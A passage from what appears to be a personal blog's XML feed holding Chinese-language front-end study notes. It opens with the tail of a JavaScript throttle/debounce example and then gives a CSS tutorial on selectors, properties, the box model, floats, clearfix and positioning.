punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>                timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> wait<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>节流: n 秒内只运行一次，若在 n 秒内重复触发，只有一次生效<br>防抖: n 秒后在执行该事件，若在 n 秒内被重复触发，则重新计时</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSS</title>
      <link href="/2023/02/20/CSS/"/>
      <url>/2023/02/20/CSS/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>层叠样式表,多个样式可以作用在同一个 HTML 元素上,同时生效</li><li>降低耦合度,让分工协作更容易,提高开发效率</li></ul><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><ol><li>内联样式</li></ol><ul><li>在标签内使用 style 属性指定 css 代码,如<code>&lt;div style=&quot;color=:red;&quot;&gt;hello css&lt;/div&gt;</code></li></ul><ol start="2"><li>内部样式</li></ol><ul><li>在 head 标签内,定义 style 标签,标签体内容就是 css 代码,如</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>hello css<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>外部样式</li></ol><ul><li>定义 CSS 资源文件</li><li>在 head 标签内,定义 link 标签,引入外部的资源文件</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- a.css文件: --></span>div&#123; color:green; &#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/a.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>hello css<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>注意:</li></ol><ul><li>1,2,3 种方式 CSS 作用范围越来越大,常用 2,3</li><li>第 3 种格式可以写为:</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token atrule"><span class="token rule">@import</span> <span class="token string">'css/a.css'</span><span class="token punctuation">;</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ol><li>格式:</li></ol><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">选择器&#123;属性名1:属性值1;属性名2:属性值2;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><p>选择器:筛选具有相似特征的元素</p></li><li><p>注意:</p></li></ol><ul><li>每一对属性需要使用<code>;</code>隔开,最后一对属性可以不加<code>;</code></li></ul><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><ul><li><p>基础选择器</p><ul><li><p>id 选择器:选择具体的 id 属性值:<code>#id&#123;&#125;</code></p></li><li><p>元素选择器:选择具有相同标签名称的元素<code>标签名称&#123;&#125;</code></p></li><li><p>类选择器:选择具有相同的 class 属性值的元素<code>.class属性值&#123;&#125;</code></p><blockquote><p>优先级:id 选择器高于类选择器高于元素选择器</p></blockquote></li></ul></li><li><p>扩展选择器</p><ul><li><p>选择所有元素:<code>*&#123;&#125;</code></p></li><li><p>后代选择器:<code>选择器1 选择器2&#123;&#125;</code>,筛选选择器 1 的的后代</p><blockquote><p>后代包括儿子，孙子，重孙…..</p></blockquote></li><li><p>子代选择器:<code>选择器1&gt;选择器2&#123;&#125;</code>,筛选选择器 1 的儿子元素</p></li><li><p>并集选择器:<code>选择器1,选择器2&#123;&#125;</code></p></li><li><p>交集选择器:<code>选择器1选择器2&#123;&#125;</code>，</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">选择带有box类的p标签 p.box</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>如果含有标签选择器，必须放在前面</p></blockquote></li><li><p>属性选择器: <code>元素名称[属性名=&quot;属性值&quot;]&#123;&#125;</code>选择元素名称,属性名&#x3D;属性值的元素</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">E[attr]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token selector">选择具有attr属性的E元素E[attr="val"]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>   选择具有attr属性且属性值等于val的E元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>伪类选择器:<code>元素:状态&#123;&#125;</code></p><p>例如:</p><p>链接伪类选择器</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">a:link</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>      <span class="token selector">未访问链接a:visited</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>   <span class="token selector">已访问链接a:hover</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>     <span class="token selector">鼠标移动到链接上a:active</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    鼠标点击时<span class="token property">a</span><span class="token punctuation">:</span>hover 必须跟在 <span class="token property">a</span><span class="token punctuation">:</span>link 和 <span class="token property">a</span><span class="token punctuation">:</span>visited后面<span class="token property">a</span><span class="token punctuation">:</span>active 必须跟在 <span class="token property">a</span><span class="token punctuation">:</span>hover后面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>焦点伪类选择器</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input:focus</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>结构伪类选择器</p><ul><li>作用 ： 根据素在 HTM L 中的结构关系查找元素</li><li>优势 ， 减少对于 HTM L 中类的依赖 ， 有利于保持代码整洁</li><li>场景 ． 常用于查找某父级选择器中的子元素</li></ul><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">E:first-child</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token selector">匹配父元素中第一个子元素 ， 并且是 E 元素E:last-child</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token selector">匹配父元素中最后一个子元素 ， 并且是 E 元素E:nth-child(n)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token selector">匹配父元素中第 n 个子元素 ， 并且是 E 元素E:nth-last-child(n)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  匹配父元素中倒数第 n 个子元素 ， 并且是 E 元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>n 为 0，1，2，3，4….</p><p>可以组成常见公式：</p><ul><li>偶数：2n even</li><li>奇数：2n+1, 2n-1, odd</li><li>前五个：-n+5</li><li>第五个往后：n+5</li></ul><p>注意：<code>an</code> 必须写在 <code>b</code> 的前面，不能写成 <code>b+an</code> 的形式。否则会不生效</p></blockquote></li><li><p>伪元素：由 CSS 模拟出的标签效果</p><p>一般页面中的非主体内容可以使用伪元素</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">:before 在父元素内容的最前添加一个伪元素 :after在父元素内容的最后添加一个伪元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><ul><li>必须设置 content 属性才能生效</li><li>伪元素默认是行内元素</li></ul></blockquote></li></ul></li></ul><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><ul><li><p>font-style:是否斜体</p><ul><li>italic</li><li>normal</li></ul></li><li><p>font-weight:是否加粗</p><ul><li>normal 与 400 等值</li><li>bold 与 700 等值</li></ul></li><li><p>font-size:字体大小</p></li><li><p>font-family:字体</p></li><li><p>color:文本颜色</p></li><li><p>font: style weight size&#x2F;line-height family</p><blockquote><p>复合属性（省略时只能省略前两个）;</p></blockquote></li></ul><h3 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h3><ul><li><p>text-align:内容水平对齐方式</p><ul><li>设置元素对齐时，需要给父标签设置 text-align</li></ul></li><li><p>text-decoration:文字装饰</p><ul><li>none:无</li><li>underline:下划线</li><li>line-through:删除线</li></ul></li><li><p>line-height:行高</p><ul><li>数字+px</li><li>倍数（当前标签 font-size 的倍数）</li></ul><blockquote><p>让单行文本垂直居中可以设置 line-height 等于文字父元素高度</p></blockquote></li></ul><h3 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h3><ul><li><p>color:文字颜色</p></li><li><p>background-color:背景颜色</p><table><thead><tr><th align="center">颜色表示方式</th><th align="center">表示含义</th><th>属性值</th></tr></thead><tbody><tr><td align="center">关键词</td><td align="center">预定义的颜色名</td><td>red,green,blue…</td></tr><tr><td align="center">RGB 表示</td><td align="center">红绿蓝三原色，取值范围 0-255</td><td>rgb(0,0,0), rgb(255,255,255)</td></tr><tr><td align="center">RGBA 表示</td><td align="center">红绿蓝三原色+a 透明度，取值范围 0-1</td><td>rgba(255,255,255,0.5)</td></tr><tr><td align="center">十六进制表示</td><td align="center">#开头，六位十六进制数字</td><td>#00000，#ff0000，#e92322</td></tr></tbody></table></li></ul><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><ul><li><p>background-color:背景颜色</p></li><li><p>background-image: url(#);</p></li><li><p>background-size：设置背景图片的大小</p><table><thead><tr><th>取值</th><th>场景</th></tr></thead><tbody><tr><td>数字+px</td><td></td></tr><tr><td>百分比</td><td>相对于当前盒子自身的宽高百分比</td></tr><tr><td>contain</td><td>包含，将背景图片等比例缩放，直到不会超过盒子的最大</td></tr><tr><td>cover</td><td>覆盖，将背景图片等比例缩放，直到刚好填满整个盒子没有空白</td></tr></tbody></table></li><li><p>background-repeat:平铺方式</p><ul><li>repeat 默认值，水平和垂直方向都平铺</li><li>no-repeat 不平铺</li><li>repeat-x</li><li>repeat-y</li></ul></li><li><p>background-position: x y;</p><ul><li>left center right</li><li>top center bottom</li></ul></li><li><p>background: color image repeat position&#x2F;size;</p><blockquote><p>不分先后顺序，建议 color image repeat position</p></blockquote></li></ul><h3 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h3><ul><li><p>border:设置边框,复合属性<code>border:1px solid red;</code></p></li><li><p>border-collapse:collapse;合并边框</p></li><li><p>border-radius: 数字+px&#x2F; 百分比</p><p><img src="/2023/02/20/CSS/image-20230313014318124.png" alt="image-20230313014318124"></p></li></ul><h3 id="尺寸"><a href="#尺寸" class="headerlink" title="尺寸"></a>尺寸</h3><ul><li>width:宽度</li><li>height:高度</li></ul><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><ul><li>list-style-type 列表标志符号</li><li>list-style-position 设置列表标志出现的位置</li><li>list-style-image 自定义列表标志想</li></ul><ul><li>list-style 列表简写（type image position）</li></ul><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><ul><li>vertical-align: middle; 调节图片垂直对齐方式</li></ul><h3 id="光标类型"><a href="#光标类型" class="headerlink" title="光标类型"></a>光标类型</h3><ul><li>cursor：设置鼠标光标在元素上时显示的样式<ul><li>default：默认指针，通常是箭头。</li><li>pointer：悬浮于链接上时，通常为手</li><li>text：指示文字可被选中</li><li>move：被悬浮的物体可被移动</li></ul></li></ul><ol><li>溢出部分显示效果</li></ol><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><ul><li>visible：默认值，溢出部分可见</li><li>hidden：隐藏</li><li>scroll：显示滚动条（无论是否溢出）</li><li>auto：根据是否溢出，自动显示或隐藏滚动条</li></ul><h3 id="元素本身隐藏"><a href="#元素本身隐藏" class="headerlink" title="元素本身隐藏"></a>元素本身隐藏</h3><ul><li>visibility: hidden （占位置，js事件不生效）</li><li>display: none （不占位置，js事件不生效）</li><li>opacity: 0 (占位置，js事件生效)</li></ul><h3 id="文字阴影"><a href="#文字阴影" class="headerlink" title="文字阴影"></a>文字阴影</h3><p>text-shadow</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>h-shadow</td><td>必须，水平偏移量。允许负值</td></tr><tr><td>v-shadow</td><td>必须，垂直偏移量。允许负值</td></tr><tr><td>blur</td><td>可选，模糊度</td></tr><tr><td>spread</td><td>可选，阴影扩大</td></tr></tbody></table><h3 id="盒子阴影"><a href="#盒子阴影" class="headerlink" title="盒子阴影"></a>盒子阴影</h3><p>box-shadow</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>offset-x</td><td>必须，水平偏移量。允许负值</td></tr><tr><td>offset-y</td><td>必须，垂直偏移量。允许负值</td></tr><tr><td>blur-radius</td><td>可选，模糊度</td></tr><tr><td>spread-radius</td><td>可选，阴影扩大</td></tr><tr><td>color</td><td>可选，阴影颜色</td></tr><tr><td>inset</td><td>可选，将阴影改为内部阴影</td></tr></tbody></table><h3 id="过渡"><a href="#过渡" class="headerlink" title="过渡"></a>过渡</h3><p>transition 让元素的样式慢慢的变化，常配合 hover 使用，增强网页交互体验</p><table><thead><tr><th>参数</th><th>取值</th></tr></thead><tbody><tr><td>过渡的属性</td><td>all：所有能过渡的属性都过渡 &#x2F; 具体属性名如 width：只有 width 有过渡</td></tr><tr><td>过渡的时长</td><td>数字+s（秒）</td></tr></tbody></table><h2 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2><ul><li>1.5px 的线没法直接画，浏览器无法识别，可以使用 3px 然后缩放 0.5 来实现</li></ul><h2 id="元素显示模式"><a href="#元素显示模式" class="headerlink" title="元素显示模式"></a>元素显示模式</h2><h3 id="块级元素"><a href="#块级元素" class="headerlink" title="块级元素"></a>块级元素</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>独占一行</li><li>宽度默认是父元素的宽度，高度默认由内容撑开</li><li>可以设置宽高</li></ul><h4 id="代表标签"><a href="#代表标签" class="headerlink" title="代表标签"></a>代表标签</h4><p><code>div,p,h系列,ul,li,dl,dt,dd,form,header,nav,footer</code></p><h3 id="行内元素"><a href="#行内元素" class="headerlink" title="行内元素"></a>行内元素</h3><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ul><li>一行可以显示多个</li><li>宽度和高度默认由内容撑开</li><li>不可以设置宽高</li></ul><h4 id="代表标签-1"><a href="#代表标签-1" class="headerlink" title="代表标签"></a>代表标签</h4><p><code>a,span, b,u,i,s,strong,ins,em,del</code></p><h3 id="行内块元素"><a href="#行内块元素" class="headerlink" title="行内块元素"></a>行内块元素</h3><h4 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h4><ul><li>一行可以显示多个</li><li>可以设置宽高</li><li>不设置宽时由内容撑开</li></ul><h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><p><code>input,textarea,button,select..</code></p><h4 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h4><p>img 标签有行内块元素特点，但是 chrome 调试工具显示为 inline</p><h3 id="显示模式转换"><a href="#显示模式转换" class="headerlink" title="显示模式转换"></a>显示模式转换</h3><ul><li>display<ul><li>block 转换成块级元素</li><li>inline-block 转换成行内块元素</li><li>inline 转换成行内元素（不常用）</li></ul></li></ul><h3 id="标签嵌套"><a href="#标签嵌套" class="headerlink" title="标签嵌套"></a>标签嵌套</h3><ul><li><p>块级元素一般作为大容器，可以嵌套：文本，块级元素，行内元素，行内块元素。。。</p><p>但是：p 标签内不要嵌套 div，p，h 等块级元素</p></li><li><p>a 标签内部可以嵌套任意元素</p><p>但是：不能嵌套 a 标签</p></li></ul><h2 id="CSS-特性"><a href="#CSS-特性" class="headerlink" title="CSS 特性"></a>CSS 特性</h2><h3 id="继承性"><a href="#继承性" class="headerlink" title="继承性"></a>继承性</h3><p>子元素有默认继承父元素样式的特点</p><p>可以继承的常见属性（文字控制属性都可以继承）</p><ul><li>color</li><li>font-style,font-weight,font-size,font-family</li><li>text-indent,text-align</li><li>line-height</li><li>…</li></ul><h3 id="层叠性"><a href="#层叠性" class="headerlink" title="层叠性"></a>层叠性</h3><p>给一个标签设置不同的样式-&gt;此时样式会层叠叠加-&gt;会共同作用在标签上</p><p>给一个标签设置相同的样式-&gt;此时样式会层叠覆盖-&gt;最终写在最后的样式会生效</p><p>注意：</p><ul><li>当样式冲突时，只有当选择器优先级相同时才能通过层叠性判断结果</li></ul><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><ol><li>同选择器具有不同的优先级 ， 优先级高的选择器样式会覆盖优先级低选择器样式</li></ol><p>继承 &lt; 通配符 &lt; 标签 &lt; 类选择器 &lt; id 选择器 &lt; 行内 &lt; !important</p><p>注意：</p><ul><li>!important 写在属性值的后面 ， 分号的前面</li><li>!important 不能提升继承的优先级 ， 只要是继承优先级最低</li><li>实际开发中不建议使用 !important 。</li></ul><ol start="2"><li><p>如果是复合选择器 ， 此时需要通过权重叠加计算方法 ， 判断最终哪个选择器优先级最高会生效</p><p>行内样式的个数 &gt; id 选择器的个数 &gt; 类选择器的个数 &gt; 标签选择器的个数</p><p>如果最终所有数字都相同，表示优先级相同，则比较层叠性</p></li></ol><h2 id="盒子模型-控制布局"><a href="#盒子模型-控制布局" class="headerlink" title="盒子模型:控制布局"></a>盒子模型:控制布局</h2><p>CSS 中规定每个盒子分别由 ： 内容区域 (content) 、内边距区域 (padding） 、 边框区域 (border) 、 外边距区域 （margin） 构成 ， 这就是盒子模型</p><ul><li><p>内容：利用 width 和 height 属性设置盒子内容区域的大小</p></li><li><p>边框：border</p><ol><li>整个边框</li></ol><ul><li>border-width: 数字 px</li><li>border-style: solid 实线，dashed 虚线，dotted 点线</li><li>border-color</li></ul><p><code>border: &lt;line-width&gt; || &lt;line-style&gt; || &lt;color&gt;</code></p><ul><li>&#96;&#96;&#96;<br>border: 10px solid&#x2F;dashed&#x2F;dotted red;<pre class="line-numbers language-none"><code class="language-none">  2. 单个边框：     border-left, border-top  &gt; 注意：border 会撑大盒子的尺寸- padding:内边距(填充)  &#96;&#96;&#96;css  &#x2F;* 四值:  上   右    下   左 *&#x2F;  padding: 10px 20px 4epx 80px;  &#x2F;* 三值: 上  左右   下 *&#x2F;  padding ： 10px 40px 8px;  &#x2F;* 两值:  上下  左右 *&#x2F;  padding: l0px 80px ；  &#x2F;* 一值:  上下左右 *&#x2F;  padding: l0px；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>默认情况下内边距会影响整个盒子的大小</p><p><code>box-sizing:border-box;</code>设置盒子的属性,让 width 和 height 就是最终盒子的大小</p></li><li><p>margin:外边距</p><p>部分标签会有默认的 margin 和 padding，比如</p><ul><li>body 标签默认有 margin：8px</li><li>p 标签默认有上下的 margin</li><li>ul 标签默认由上下的 margin 和 padding-left</li></ul><p>解决办法：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">*</span> <span class="token punctuation">&#123;</span>  <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>  <span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>版心居中：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css">margin：0 auto<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><p>外边距折叠–合并现象：垂直布局的块级元素，上下的 margin 会合并，最终两者距离为最大值</p><p>解决：只给一个盒子设置 margin 即可</p></li><li><p>外边距折叠–塌陷现象：互相嵌套的块级元素 ， 子元素的 margin-top 会作用在父元素上</p><p>解决：</p><ul><li>给父元素设置 border-top 或者 padding-top （ 分隔父子元素的 margin-top)</li><li>给父元素设置 overflow: hidden</li><li>转换行内块元素</li><li>设置浮动</li></ul></li><li><p>行内元素通过 margin 或 padding 改变垂直位置无法生效</p><p>解决：通过设置行高 line-height</p></li></ul></blockquote></li></ul><h2 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h2><p>用于布局，让垂直布局的盒子变成水平布局，如：一个在左，一个在右</p><h3 id="标准流"><a href="#标准流" class="headerlink" title="标准流"></a>标准流</h3><p>又称文档流 ， 是浏览器在渲染显示网页内容时默认采用的一套排版规则， 规定了应该以何种方式排列元素</p><p>常见标准流排版规则：</p><ol><li>块级元素 ： 从上往下 ， 垂直布局 ， 独占一行</li><li>行内元素或行内块元素 ： 从左往右 ， 水平布局 ， 空间不够自动折行</li></ol><h3 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h3><p>float:</p><ul><li>left 左浮动</li><li>right 右浮动</li></ul><h4 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a>特点</h4><ol><li><p>浮动元素会脱离标准流（简称：脱标），在标准流中不占位置</p><p>相当于从地面飘到了空中 z</p></li><li><p>浮动元素比标准流高半个级别，可以覆盖标准流中的元素</p></li><li><p>浮动找浮动，下一个浮动元素会在上一个浮动元素后面左右浮动</p></li><li><p>浮动元素有特殊的显示效果</p><ul><li>一行可以显示多个</li><li>可以设置宽高</li></ul></li></ol><blockquote><p>浮动的元素不能通过<code>text-align:center</code>或者<code>margin:0 auto</code> 居中</p></blockquote><h3 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h3><h4 id="浮动带来的影响"><a href="#浮动带来的影响" class="headerlink" title="浮动带来的影响"></a>浮动带来的影响</h4><p>如果子元素浮动了，此时子元素不能撑开标准流的块级父元素</p><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>子元素浮动后脱离标准流–&gt;不占位置</p><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><p>需要父元素有高度，从而不影响其他网页元素的布局</p><h4 id="途径"><a href="#途径" class="headerlink" title="途径"></a>途径</h4><ul><li><p>直接设置父元素高度</p><p>优点：简单粗暴，方便</p><p>缺点；有些布局中不适合固定父元素高度</p></li><li><p>额外标签法</p><p>操作：</p><ol><li>在父元素内容的最后添加一个块级元素</li><li>给添加的块级元素设置 clear:both</li></ol><p>缺点：会在页面中添加额外的标签，让页面的 html 结构变得复杂</p></li><li><p>单伪元素清楚法</p><p>操作：</p><ol><li><p>基本写法：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.clearfix::after</span> <span class="token punctuation">&#123;</span>  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  <span class="token property">clear</span><span class="token punctuation">:</span> both<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>补充写法</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.clearfix::after</span> <span class="token punctuation">&#123;</span>  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  <span class="token property">clear</span><span class="token punctuation">:</span> both<span class="token punctuation">;</span>  <span class="token comment">/* 补充代码：在网页中看不到伪元素*/</span>  <span class="token property">height</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>  <span class="token property">visibility</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>特点：直接给标签加类即可清除浮动</p></li><li><p>双伪元素清除法</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.clearfix::before,.clearfix::after</span> <span class="token punctuation">&#123;</span>  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token property">display</span><span class="token punctuation">:</span> table<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.clearfix::after</span> <span class="token punctuation">&#123;</span>  <span class="token property">clear</span><span class="token punctuation">:</span> both<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>给父元素设置 overflow : hidden</p></li></ul><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><ol><li><p>设置定位方式</p><p>position: 属性值 ;</p><p>常见属性值：</p><table><thead><tr><th>定位方式</th><th>属性值</th></tr></thead><tbody><tr><td>静态定位</td><td>static</td></tr><tr><td>相对定位</td><td>relative</td></tr><tr><td>绝对定位</td><td>absolute</td></tr><tr><td>固定定位</td><td>fixed</td></tr></tbody></table></li><li><p>设置偏移值</p><p>水平+垂直就近各取一个</p><table><thead><tr><th>方向</th><th>属性名</th><th>属性值</th><th>含义</th></tr></thead><tbody><tr><td>水平</td><td>left</td><td>数字+px</td><td>距离左边的距离</td></tr><tr><td>水平</td><td>right</td><td>数字+px</td><td>距离右边的距离</td></tr><tr><td>垂直</td><td>top</td><td>数字+px</td><td>距离上边的距离</td></tr><tr><td>垂直</td><td>bottom</td><td>数字+px</td><td>距离下边的距离</td></tr></tbody></table></li></ol><h3 id="静态定位"><a href="#静态定位" class="headerlink" title="静态定位"></a>静态定位</h3><p>默认值，就是标准流</p><h4 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h4><p><code>position: static;</code></p><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>静态定位就是之前标准流，不能通过方位属性进行移动</p><h3 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h3><p>相对于自己之前的位置进行移动</p><h4 id="方式-1"><a href="#方式-1" class="headerlink" title="方式"></a>方式</h4><p><code>position: relative</code></p><h4 id="特点-4"><a href="#特点-4" class="headerlink" title="特点"></a>特点</h4><ol><li>需要配合方位属性实现移动</li><li>相对于自己原来位置进行移动</li><li>在页面中占位置 –&gt; 没有脱标</li></ol><h3 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h3><p>相对于非静态定位的父元素进行定位移动</p><h4 id="方式-2"><a href="#方式-2" class="headerlink" title="方式"></a>方式</h4><p><code>position: absolute</code></p><h4 id="特点-5"><a href="#特点-5" class="headerlink" title="特点"></a>特点</h4><ol><li>需要配合方位属性实现移动</li><li>默认相对于浏览器可视区域进行移动</li><li>在页面中不占位置 → 已经脱标</li></ol><blockquote><p>配合绝对定位的父元素一起使用（子绝父相）</p></blockquote><h4 id="绝对定位相对于谁进行偏移"><a href="#绝对定位相对于谁进行偏移" class="headerlink" title="绝对定位相对于谁进行偏移"></a>绝对定位相对于谁进行偏移</h4><ol><li>祖先元素中没有定位 –&gt; 默认相对于浏览器进行移动</li><li>祖先元素中有定位 –&gt; 相对于 最近的 有定位 的祖先元素进行移动</li></ol><h3 id="固定定位"><a href="#固定定位" class="headerlink" title="固定定位"></a>固定定位</h3><p>相对于浏览器进行定位移动</p><h4 id="方式-3"><a href="#方式-3" class="headerlink" title="方式"></a>方式</h4><p><code>position: fixed</code></p><h4 id="特点-6"><a href="#特点-6" class="headerlink" title="特点"></a>特点</h4><ol><li>需要配合方位属性实现移动</li><li>相对于浏览器可视区域进行移动</li><li>在页面中不占位置 → 已经脱标</li></ol><h4 